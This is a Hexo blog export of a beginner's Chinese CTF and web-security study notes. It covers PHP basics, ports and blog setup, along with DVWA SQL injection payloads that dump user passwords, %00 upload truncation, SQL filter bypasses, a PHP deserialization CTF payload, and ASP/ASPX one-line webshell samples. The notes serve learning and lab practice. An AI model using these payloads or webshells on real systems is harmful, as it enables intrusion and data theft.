原理：系统在以十六位方式读取文件，当读到00时就会结束读取。可以用于绕过一些对扩展名的验证。这里的00是指被读取后的十六位ASCII为0x00，而文件名中的对应的东西显示出来是一个框框。 方法：可以先在文件名中加入两个较为好找的字符，用hex打开后寻找到加进去的字符对应的16进制内容，对前一个的数字进行修改，改为00。ereg()函数：ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的两个漏洞：1.%00截断及遇到%00则默认为字符串的结束 2.当传递的参数为数组时它的返回值不是FALSE%00截断：url编码时会把%00编码为空值，就和0x00截断一样；url编码会把‘#’编码为空，因此想要成功发送出去，就需要写成url编码后的格式（%23）； ereg()在php5.3已经被废弃了参考：关于00截断的一些思考2019.10.31DVWA通常情况下，SQL注入的位置包括：（1）表单提交，主要是POST请求，也包括GET请求；（2）URL参数提交，主要为GET请求参数；（3）Cookie参数提交；（4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；（5）一些边缘的输入点，比如.mp3文件的一些文件信息等。SQL手工注入的一般步骤：(没懂里面的原理) 1.判断是否存在注入，注入是字符型还是数字型:2.猜解SQL查询语句中的字段数1′ or 1=1 order by 1 #3.确定显示的字段顺序1′ union select 1,2 #4.获取当前数据库1′ union select 1,database() #5.获取数据库中的表1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #6.获取表中的字段名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #7.下载数据1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #（一般情况下要进行SQL注入攻击，需要对数据库类型、表名、判断逻辑、查询语句等比较清楚才能够写出有效的SQL注入语句。）判断SQL注入是字符型还是数字型：数字型判断可以用and 1=1和and 1=2来判断，Url 地址中输入 www.xxx.com/abc.php?id= x and 1=1页面依旧运行正常，继续进行下一步。Url 地址中继续输入 www.xxx.com/abc.php?id= x and 1=2页面运行错误，则说明此 Sql 注入为数字型注入。这是因为输入and1=1时，后台执行SQL语句：select * from &lt;表名&gt; where id = x and 1=1判断正确，返回正常；输入and1=2时执行select * from &lt;表名&gt; where id = x and 1=2虽然语法没有错误，但逻辑上有错误，返回错误。而如果这是一个字符型注入的话，and1=2会被当做一串字符，不会进行逻辑的判断。字符型判断使用and ‘1’=’1 和 and ‘1’=’2来判断；Url 地址中输入 www.xxx.com/abc.php?id= x&#39; and &#39;1&#39;=&#39;1页面运行正常，继续进行下一步。Url 地址中继续输入 www.xxx.com/abc.php?id= x&#39; and &#39;1&#39;=&#39;2页面运行错误，则说明此 Sql 注入为字符型注入。原因如下：当输入 and ‘1’=’1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;1&#39;语法正确，逻辑判断正确，所以返回正确。当输入 and ‘1’=’2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;2&#39;语法正确，但逻辑判断错误，所以返回正确。 用到的一些函数：var_dump() 函数用于输出变量的相关信息。empty()和isset():都可以用来判断变量是否存在，empty是判定是否为空，isset判定是否被定义。mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。用于预防数据库攻击。SQL注入中的绕过：1.十六进制绕过：用于引号绕过，直接把引号内的字符串化成十六进制的样子；2.绕过空格：用注释绕过空格、括号绕过空格；3.逗号绕过：使用from或者offset；4.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）；5.or and xor not绕过6.绕过注释符号（#，–(后面跟一个空格））过滤7.=绕过8.绕过union，select，where等9.通用绕过（编码）10.等价函数绕过参考： SQL injection SQL注入中的绕过 301重定向与302跳转：301重定向是永久的定向，如使用域名跳转，搜索引擎在抓取新内容的同时也将旧的网址替换为重定向之后的网址；302跳转是暂时的跳转，登陆的用户访问用户中心重定向到登录页面。搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回302代码，搜索引擎认为新的网址只是暂时的。而许多搜索对301比较友好对302不友好，且302会加重服务器的性能损耗。 2019.11.2php：requre()函数：引入另外一个文件过来；require_once()函数：和唯一不同的是如果该文件中的代码已经被包含了，则不会再次包含。new：实例化，$x = new Shield();把Shield函数返回的结果保存在$x里，或是实例化一个类。class（类）：用于表示要在应用程序中处理的实际事物。‘$this-&gt;’伪变量：用于类定义的内部访问自己的函数和变量，可以理解为“我自己的”、“当前对象”。eg：$this-&gt;functionName();操作符’::’如果是在类的外面，需要先实例化，才能调用类中的方法。stripos(string,find,start)：查找字符串在另一字符串中首次出现的位置，不区分大小写，strpos函数区分大小写。参考：php类中的class PHP反序列化：函数：serialize() unserialize()什么是php序列化：把一个对象转换成可以传输的字符串。方便每次使用的时候放出来。什么是php反序列化：把那个字符串变回来。参考：最通俗易懂的PHP反序列化原理分析 2019.11.3-11.4php phpinfo()函数：输出关于PHP配置的信息，包括了PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)； fopen()打开文件或者url； PHP反序列化漏洞（PHP对象注入）目前了解到的是关于魔术方法（Magic function）触发的漏洞，也就的是当运行unserialize时会直接运行一些魔术方法，如果一些漏洞在这些魔术方法里的话，当我们控制序列化字符串时就可以直接触发他们。 魔术方法及触发构造函数construct()：当对象创建(new)时会自动调用.析构函数destruct()：当对象被销毁时会自动调用。__wakeup() ：unserialize()时会自动调用。 参考：浅谈php反序列化 2019.11.6-11.7php面向对象：函数和成员方法的唯一区别是，函数实现的是某个独立的功能，成员方法实现的是类的一个行为，是类的一部分；构造方法（__construct()生成对象时自动初始化对象）、析构方法（对象被销毁时调用释放内存）；继承：子类继承父类的所有成员变量和方法，子类实例化时会先用子类的构造方法，如果子类没有就会去调用父类中的构造方法。多态（覆盖&amp;重载）：覆盖：也就是说子类中如果有和父类一样名字的成员方法，实例化子类时就会调用子类中的方法（在子类中重写父类的方法）。重载：一个标识符被用作多个变量名，且可以通过函数参数个数和参数类型把这些同名的函数区分开来。类的三个性质：封装性、继承性、多态性。这里说下不太清楚的封装性：也叫做信息隐藏。把类的使用和现实分开，只保留有限的接口与外部联系。面向对象的封装就是把描述一个对象的属性和行为的代码封装在一个“模块”中，也就是一个类中，属性用变量定义，行为用方法进行定义，方法可以直接访问同一个对象中的属性。数据隐藏（封装）：通过关键字来限定成员变量和成员方法。public:所有变量、方法默认都为public，在程序任何位置都可以被调用；private：只在当前类中可以调用、修改；protected：可以在本类和子类中被调用；static静态变量：ststic静态变量（方法）：调用格式：关键字::静态成员静态相当于在给它了一个单独的地方放数据，使用静态成员不需要实例化对象，且对象被修改后仍保留被修改后的数据。静态方法中只能调用静态变量，而普通方法可以调用静态变量。 12345678910111213141516&lt;?phpclass Xun9er&#123; static $num=0; public function showme()&#123; echo &apos;宁是第&apos;.self::$num.&apos;位访客&apos;; self::$num++; &#125;&#125;$book=new Xun9er();$book-&gt;showme();echo &quot;&lt;br&gt;&quot;;$book2=new Xun9er();$book2-&gt;showme();echo &quot;&lt;br&gt;&quot;;echo &apos;宁是第&apos;.Xun9er::$num.&apos;位访客&apos;; //直接使用类名调用静态变量?&gt; 运行结果：如果把static改成其他的： 12345678910111213141516&lt;?phpclass Xun9er&#123; private $num=0; public function showme()&#123; echo &apos;宁是第&apos;.self::$num.&apos;位访客&apos;; self::$num++; &#125;&#125;$book=new Xun9er();$book-&gt;showme();echo &quot;&lt;br&gt;&quot;;$book2=new Xun9er();$book2-&gt;showme();echo &quot;&lt;br&gt;&quot;;echo &apos;宁是第&apos;.Xun9er::$num.&apos;位访客&apos;; //直接使用类名调用静态变量?&gt; 运行结果：致命错误：未捕获错误：访问未声明的静态属性 Geeksocre 10000!!!! 123456789101112131415161718&lt;br&gt;&lt;!--class Student&#123; public $score = 0; public function __destruct() &#123; echo &quot;__destruct working&quot;; if($this-&gt;score==10000) &#123; $flag = &quot;******************&quot;; echo $flag; &#125; &#125;&#125;$exp = $_GET[&apos;exp&apos;];echo &quot;&lt;br&gt;&quot;;unserialize($exp);?&gt; 比之前在网上看的例子要简单一些，在反序列化函数unserialize运行时，自动调用__destruct，因此，构造一个序列化字符串，使得score=1000，再通过get上传，反序列化执行时会把score的值赋为10000。最后。。上面写的“socre 10000!!!!”，后面的变量又是“score”，是写错了还是故意为难我这种不细心的人？构造序列化字符串： 12345678910111213141516&lt;?phpclass Student&#123; public $score = 0; public function __destruct() &#123; echo &quot;__destruct working&quot;; if($this-&gt;score==10000) &#123; $flag = &quot;******************&quot;; echo $flag; &#125; &#125;&#125;$class4 = new Student();$class4-&gt;score = &quot;10000&quot;; $class4_ser = serialize($class4); print_r($class4_ser);?&gt; 得到： 1O:7:&quot;Student&quot;:1:&#123;s:5:&quot;score&quot;;s:5:&quot;10000&quot;;&#125;__destruct working****************** 这里的”O”(大写)代表存储的是对象（object）,假如给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。”Student”表示对象的名称。1表示有一个值。{s:5:”score”;s:5:”10000”;}中，s表示字符串，5表示该字符串的长度，”score”为字符串的名称。 上传： 1http://148.70.59.198:42374/?exp=O:7:%22Student%22:1:&#123;s:5:%22score%22;s:5:%2210000%22;&#125; 得到flag： 2019.11.8MD5绕过根据MD5的特性，有两点漏洞1.两个开头为0的md5值相同。2.md5不能处理数组。参考：md5绕过 hash长度扩展攻击没怎么看懂 先把网址摆这儿 HASH长度扩展攻击","categories":[],"tags":[]},{"title":"","slug":"2019-10-26","date":"2019-10-26T08:44:10.299Z","updated":"2019-12-14T12:42:41.985Z","comments":true,"path":"2019/10/26/2019-10-26/","link":"","permalink":"http://yoursite.com/2019/10/26/2019-10-26/","excerpt":"一些整理Xun9er 2019.10.26 1. markdown做笔记： 软件使用：Studio Code、Sunblime（需要安装插件：pakage、markdownlivepreview、设置快捷键win+M）、markdownpad。 常见的用法（而我又有点记不清的部分）：表格（两种办法：一是markdown“—|—|”这样的方式，但上传博客的话识别不了；二是使用php标签&lt;table&gt;&lt;tr&gt;&lt;td&gt;等，博客可以识别。）空格：插入一个空格 (non-breaking space)&emsp; &amp;nbsp; 或&amp;#160; 或&amp;#xA0;&emsp;&emsp;&emsp; 插入两个空格 (en space)&emsp; &amp;ensp; 或 &amp;#8194; 或 &amp;#x2002;&emsp;&emsp;&emsp; 插入四个空格 (em space)&emsp; &amp;emsp; 或 &amp;#8195; 或 &amp;#x2003;&emsp;&emsp;&emsp; 插入细空格 (thin space)&emsp; &amp;thinsp; 或 &amp;#8201; 或 &amp;#x2009;链接 :[Title](URL)图片：![]() 2.百度搜索3.bugku水题： 查看源代码 控制台的简单使用：max hackbar4.一点点php的知识（学到表单，安装了phpstudy、搭建了本地网站wordpress）以及比php更少的python知识。","text":"一些整理Xun9er 2019.10.26 1. markdown做笔记： 软件使用：Studio Code、Sunblime（需要安装插件：pakage、markdownlivepreview、设置快捷键win+M）、markdownpad。 常见的用法（而我又有点记不清的部分）：表格（两种办法：一是markdown“—|—|”这样的方式，但上传博客的话识别不了；二是使用php标签&lt;table&gt;&lt;tr&gt;&lt;td&gt;等，博客可以识别。）空格：插入一个空格 (non-breaking space)&emsp; &amp;nbsp; 或&amp;#160; 或&amp;#xA0;&emsp;&emsp;&emsp; 插入两个空格 (en space)&emsp; &amp;ensp; 或 &amp;#8194; 或 &amp;#x2002;&emsp;&emsp;&emsp; 插入四个空格 (em space)&emsp; &amp;emsp; 或 &amp;#8195; 或 &amp;#x2003;&emsp;&emsp;&emsp; 插入细空格 (thin space)&emsp; &amp;thinsp; 或 &amp;#8201; 或 &amp;#x2009;链接 :[Title](URL)图片：![]() 2.百度搜索3.bugku水题： 查看源代码 控制台的简单使用：max hackbar4.一点点php的知识（学到表单，安装了phpstudy、搭建了本地网站wordpress）以及比php更少的python知识。 通过geek学到了:1. 一句话木马 常见的如下‘php：asp：&lt;%eval request (“pass”)%&gt;aspx：&lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;’eval() 函数把字符串按照 PHP 代码来计算。经典一句话木马大多都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分。及在某网页的邮箱注册之类的地方上传一句话木马，再利用本地的网页链接获得Webshell。2. 代码审计目前只是了解了一下：1、 “==”我们称之为等值符，当等号两边为相同类型时，直接比较值是否相等；当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照常数值进行比较。如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。2、 “array_search”与is_array”绕过 我们可以传入test[]=0来进行绕过，首先test是一个数组，符合is_array的判断，然后test=0；在array_search中0==admin为true，绕过了array_search。3、 strcmp漏洞绕过 strcmp是比较两个字符串，str1&lt;str2，返回&lt;0，str1&gt;str2,返回&gt;0,相等时返回等于03. burpsuitintruder：sniper – 对变量依次进行暴力破解。battering ram – 对变量同时进行破解。pitchfork – 每一个变量标记对应一个字典，一一对应进行破解。cluster bomb – 每个变量对应一个字典，并且进行交叉式破解，尝试各种组合。适用于用户名+密码的破解。4. sql注入5. 条件竞争 逻辑问题 太快地请求导致的错误6. 科学上网首先用的SSD vps 但基本被墙了但学会了怎么简单地判断vps是否被墙： 1. ping 2.国内端口 3.国外端口（ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。）vps和vpn1、我们可以把VPS理解为服务器。一台服务器用软件分割开以后，就成了多台服务器，他们有独立的操作系统，具有独立的IP，这个时候每一个小的独立操作系统，就是一个VPS。也可以理解为，VPS就是一个配置低了点的服务器。2、VPN是一个软件。用一个帐号和密码，我们登陆了以后，我们的机器访问网站或者是上QQ或者是登陆一些网络软件的时候，所显示的和使用的IP都是国外的。也就是说，VPN是一个可以让我们的机器直接连接到国外的网线上的东西。VPN分为两种，一种是静态的VPN，另外一种就是动态的VPN。动态的VPN是每登陆一次，就变化一次IP的。7. 暴力破解加密压缩包：rar压缩包，用的是AccentRPR_x64，打开有个zip，用的是ARCHPR。 搭建博客之前已经说得比较清楚 这里就不赘述了","categories":[],"tags":[]},{"title":"","slug":"2019-10-10","date":"2019-10-25T08:37:06.978Z","updated":"2019-11-10T08:54:01.000Z","comments":true,"path":"2019/10/25/2019-10-10/","link":"","permalink":"http://yoursite.com/2019/10/25/2019-10-10/","excerpt":"bugkuXun9er 2019.10.10做了几道ctf的水题，不过呢，也是个从无到有的进步，记录一下","text":"bugkuXun9er 2019.10.10做了几道ctf的水题，不过呢，也是个从无到有的进步，记录一下 滑稽 直接看源代码就好 计算器 把size改改 web基础$_GIT 传递数据的方法为GIT 就直接在连接后面加上?what=flag web基础$_POST POST方法传递数据 用max hackbar(hackbar要收费) load URL之后在post data栏输入what=flag就是这样，，，也没啥说的了，， 此外：GIT和POST的区别： git post GET用于从服务器端获取数据 POST用于向服务器提交数据 GET是通过URL方式请求，可以直接看到，明文传输。 POST是通过请求header请求，可以用开发者工具或者抓包可以看到，同样也是明文的。 GET请求的数据会附在URL之后，以?分割URL和传输数据，参数之间以&相连 POST把提交的数据则放置在是HTTP包的包体中 GET产生一个TCP数据包 POST产生两个TCP数据包 GET请求的时候，会把HEADER和DATA一起发送给服务器 POST，浏览器先发送Header，服务器响应100 Continue，浏览器再发送DATA，服务器响应200 OK（返回数据） get安全性非常低，但是执行效率却比Post方法好 post安全性较高。 GET的参数只能支持ASCII POST能支持任意binary，包括中文。 参考：https://www.zhihu.com/question/28586791 Xun9er 2019.10.11 你必须让它停下 （莫名其妙就做出来了？？没搞懂的我又搜了搜网上的资料）进去之后网页一直不停刷新，查看器看到有&lt;a style=&quot;display:none&quot;&gt;flag is here~&lt;/a&gt;要让他停下来。看到有两种解决办法，一种是抓包，放到repeater上多跑几回flag就出来了。还有一种是关闭浏览器的js，这个没试。那么问题来了，我两种方法都没用，flag自己就出来了？？？懵，康康是什么问题。。。。。。。等我发现了再说吧。","categories":[],"tags":[]},{"title":"note 2019.10.7","slug":"note-2019-10-7","date":"2019-10-21T15:07:48.000Z","updated":"2019-12-15T14:09:08.201Z","comments":true,"path":"2019/10/21/note-2019-10-7/","link":"","permalink":"http://yoursite.com/2019/10/21/note-2019-10-7/","excerpt":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 国庆划水Xun9er 2019.10.7 Brupsuite 是什么 怎么用 首先要安装Java jdk（会同时安装Java jdk和Java jre，需要注意的是它们俩不能安装在一个文件夹里，否则会出现文件覆盖，就运行不了javac。）","text":"var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); 国庆划水Xun9er 2019.10.7 Brupsuite 是什么 怎么用 首先要安装Java jdk（会同时安装Java jdk和Java jre，需要注意的是它们俩不能安装在一个文件夹里，否则会出现文件覆盖，就运行不了javac。） 科学上网 vps可能被墙，就连不上 可能的情况如下： 1、国内检测端口是关闭，国外检测端口是开放，可以肯定的说明VPS已经被墙 2、国内检测端口是关闭，国外检测端口也是关闭，这个时候应该首先排除VPS被墙，应该检测一下VPS是否是在运行状态，很有可能这种情况是因为VPS没有开机的原因。 3、国内检测端口是开放，说明VPS没有被墙，连接不上SSH的主要原因请查看IP、root密码以及端口是否填写正确。ping国内端口国外端口so。。。还不如用SSR 端口一些常见的端口号及其用途如下：21端口：FTP 文件传输服务22端口：SSH 端口23端口：TELNET 终端仿真服务25端口：SMTP 简单邮件传输服务53端口：DNS 域名解析服务80端口：HTTP 超文本传输服务110端口：POP3 “邮局协议版本3”使用的端口443端口：HTTPS 加密的超文本传输服务1433端口：MS SQL*SERVER数据库 默认端口号1521端口：Oracle数据库服务1863端口：MSN Messenger的文件传输功能所使用的端口3306端口：MYSQL 默认端口号3389端口：Microsoft RDP 微软远程桌面使用的端口5631端口：Symantec pcAnywhere 远程控制数据传输时使用的端口5632端口：Symantec pcAnywhere 主控端扫描被控端时使用的端口5000端口：MS SQL Server使用的端口8000端口：腾讯QQ bloghexo server 打不开 要先安装它： npm install hexo-server -save（要在blog目录下执行）","categories":[],"tags":[]},{"title":"Welcome to Xun9er's blog!!","slug":"Welcome-to-Xun9er-blog","date":"2019-10-06T09:40:51.000Z","updated":"2019-11-09T04:03:54.466Z","comments":true,"path":"2019/10/06/Welcome-to-Xun9er-blog/","link":"","permalink":"http://yoursite.com/2019/10/06/Welcome-to-Xun9er-blog/","excerpt":"blog 搭建心得Xun9er 2019.10.6 真（wo） 开(hao) 心(nan)弄了一天终于搭好了，遇到了一些坑，但网上的解决方法蛮详细，还是都一一解决了。还有一些东西没搞清楚，需要多熟悉熟悉叭。 过程 环境准备：node、git安装 安装hexo cnpm install -g hexo-cli（为防止npm卡顿，先用npm install -g cnpm --registry=http://registry.npm.taobao.org） 注册GitHub hexo init初始化博客 新建GitHub仓库 接下来就连网，安装git插件（cnpm install hexo-deployer-git --save），设置—config.yml文件，可用notepad打开，然后在显示的底部填type： git 并补充repo： 仓库地址、branch： master 发送到远端hexo d 主题 git clone http://github.com/litten/hexo-theme-yilia.git themes/yilia","text":"blog 搭建心得Xun9er 2019.10.6 真（wo） 开(hao) 心(nan)弄了一天终于搭好了，遇到了一些坑，但网上的解决方法蛮详细，还是都一一解决了。还有一些东西没搞清楚，需要多熟悉熟悉叭。 过程 环境准备：node、git安装 安装hexo cnpm install -g hexo-cli（为防止npm卡顿，先用npm install -g cnpm --registry=http://registry.npm.taobao.org） 注册GitHub hexo init初始化博客 新建GitHub仓库 接下来就连网，安装git插件（cnpm install hexo-deployer-git --save），设置—config.yml文件，可用notepad打开，然后在显示的底部填type： git 并补充repo： 仓库地址、branch： master 发送到远端hexo d 主题 git clone http://github.com/litten/hexo-theme-yilia.git themes/yilia 问题总结一下这之中遇到的问题：1.hexo server(启动博客) 打不开 要先安装它： npm install然后再hexo-server -save（要在blog目录下执行）2.设置—config.yml文件时冒号后要有空格3.第二天打开就变成404 ？？？ 阿里云解析改为CNAM GitHub的setting也要改 在source目录下创建CNAME文件","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-10-06T09:17:55.817Z","updated":"2019-10-06T09:17:55.817Z","comments":true,"path":"2019/10/06/hello-world/","link":"","permalink":"http://yoursite.com/2019/10/06/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}